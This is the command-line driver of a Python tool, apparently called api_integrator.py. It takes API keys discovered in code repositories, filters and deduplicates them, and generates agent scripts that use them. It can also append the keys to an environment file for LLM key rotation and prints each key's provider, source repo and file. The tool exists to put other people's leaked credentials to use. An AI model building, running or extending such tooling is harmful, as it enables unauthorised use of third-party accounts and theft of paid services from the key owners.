def main():
    parser = argparse.ArgumentParser(
        description="Auto-integrate discovered API keys as working agent scripts."
    )
    parser.add_argument(
        "--input",
        default=r"output\validated_*.json",
        help="Input validated findings JSON (glob supported, default: output/validated_*.json)",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Print what would be generated without writing files",
    )
    parser.add_argument(
        "--inject-llm-rotate",
        action="store_true",
        help=f"Append found keys to {FOUND_KEYS_ENV}",
    )
    parser.add_argument(
        "--out-dir",
        default="found_agents",
        help="Output directory for agent scripts (default: found_agents)",
    )
    args = parser.parse_args()

    # Resolve out_dir relative to this script's directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    out_dir = args.out_dir if os.path.isabs(args.out_dir) else os.path.join(script_dir, args.out_dir)

    # Resolve input glob relative to script dir
    input_pattern = args.input if os.path.isabs(args.input) else os.path.join(script_dir, args.input)

    print("api_integrator.py")
    print(f"  input:           {input_pattern}")
    print(f"  out_dir:         {out_dir}")
    print(f"  dry_run:         {args.dry_run}")
    print(f"  inject-llm-rotate: {args.inject_llm_rotate}")
    print("-" * 70)

    # Load and filter findings
    print("Loading findings...")
    all_findings = _load_findings(input_pattern)
    print(f"  total loaded:    {len(all_findings)}")

    valid = _filter_findings(all_findings)
    print(f"  VALID+CRIT/HIGH: {len(valid)}")

    unique = _dedup(valid)
    print(f"  unique keys:     {len(unique)}")
    print()

    if not unique:
        print("No qualifying findings — nothing to generate.")
        print()
        print("Summary:")
        print("  0 agents generated")
        return

    print("Qualifying findings:")
    _print_table(unique)
    print()

    print("Generating agents...")
    results = integrate(unique, out_dir, args.dry_run, args.inject_llm_rotate)

    print()
    print("Writing test_all.py...")
    _write_test_all(out_dir, args.dry_run)

    print()
    print("=" * 70)
    print(f"Summary: {len(results)} agent(s) generated in {out_dir}")
    if args.dry_run:
        print("(dry-run — no files written)")
    if args.inject_llm_rotate and not args.dry_run:
        print(f"Keys appended to: {FOUND_KEYS_ENV}")
    print()

    # Print final table
    if results:
        print(f"  {'#':<3} {'Provider':<14} {'Repo':<35} {'File':<45} {'Key'}")
        print("  " + "-" * 110)
        for i, r in enumerate(results, 1):
            print(
                f"  {i:<3} {r['provider']:<14} {r['repo']:<35} "
                f"{r['agent_file']:<45} {r['key_truncated']}"
            )


if __name__ == "__main__":
    main()
